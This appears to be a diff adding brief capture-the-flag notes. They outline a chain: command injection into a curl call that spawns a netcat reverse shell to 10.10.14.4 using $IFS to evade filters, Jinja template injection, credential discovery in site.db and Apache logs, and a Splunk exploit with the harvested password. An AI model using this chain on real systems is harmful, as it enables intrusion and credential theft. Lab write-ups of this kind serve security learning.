@@ -1,0 +1,10 @@
+method 1: rce in url
+	machine running "curl $postcontent"
+	http://10.10.14.4/$(nc-reverse-shell) # utilizing $IFS to avoid bad chars
+method 2: server-side template injection
+	post content which gets stored in /archive vulnerable to jinja template injection
+	rce
+site.db in web dir
+cat /var/log/apache2/backup | awk '{print $7}' | sort | uniq -c | sort -n
+password for shaun found
+splunkd exploit with shaun creds
